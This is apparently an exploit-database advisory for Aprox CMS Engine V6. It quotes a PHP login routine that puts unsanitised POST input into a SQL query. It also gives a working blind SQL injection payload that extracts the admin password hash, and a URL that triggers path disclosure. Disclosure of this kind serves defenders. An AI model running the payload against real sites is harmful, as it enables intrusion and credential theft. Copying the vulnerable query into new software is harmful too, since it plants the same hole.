@@ -1,0 +1,74 @@
+# Exploit Title: Aprox CMS Engine V6 Multiple Vulnerabilities
+# Date: 03.10.2010
+# Author: Stephan Sattler // http://www.solidmedia.de
+# Software Website: http://www.aprox.de/
+# Software Link: http://www.aprox.de/index.php?page=d&application=zip&dateiname=AproxEngine_v6
+# Version: 6
+ 
+ 
+[ Vulnerability 1]
+
+# Vulnerable Code:
+
+sql_login.inc line 63-91
+
+	if (isset($_GET["action"]) && ($_GET["action"] != "")){$action = $_GET["action"];}
+        unset($password);
+	if (isset($_POST["password"]) && ($_POST["password"] != "")){$password = md5($_POST["password"]);}
+        unset($login);
+	if (isset($_POST["login"]) && ($_POST["login"] != "")){$login = $_POST["login"];}
+
+if (($login=="") or ($password=="")) {echo "Angegeben nicht vollständig!";die;}
+
+$db = mysql_connect(serverhost, user, pass, database);
+$abfrage = "select * from ". suffix ."users where login = '$login'";
+$res = mysql_db_query(database,  "$abfrage");
+
+$num = mysql_num_rows($res);
+#echo $num;
+if ($num >0)
+{
+#echo "user gefunden,<br>";
+$pass = mysql_result($res, 0, 'password');
+if ($password == $pass) 
+{
+echo "Alles OK!!!";
+$name = mysql_result($res, 0, 'real_name');
+
+$_SESSION["name"] = $name;
+$_SESSION["login"] = $login;
+$_SESSION["pass"] = $pass;
+
+$login_gepruefter_user = mysql_result($res, 0, 'gepr_mitglied');
+$_SESSION["gepruefter_user"] = $login_gepruefter_user;
+
+
+ 
+
+# Explanation:
+
+$_POST["login"] isn't sanitized before executing the database query.
+An attacker can use this for a blind SQL injection attack.
+
+
+# Exploiting the Vulnerability // PoC:
+
+URL: http://[site]/[path]/index.php?page=sql_login
+
+Postdata(Example for the admin user which is created after install):
+
+login=admin' and ascii(substring((SELECT concat(password) from aprox_users limit 0,1),1,1))>'100&password=passwort&Submit=Login
+
+->if login succeeds, the first character of the hash is greater than d(ascii 100).
+
+An attacker can insert his/her own login credentials and test it with them or do it with benchmark() without a user-account.
+Aprox stores failed logins in a Session so this won't prevent an attack.
+
+
+[Vulnerability 2]
+
+# Path Disclosure
+
+
+For Example: http://[site]/[path]/index.php?id=1 AnD 1=1 
+will provoke an error so the full path will be presented to you.
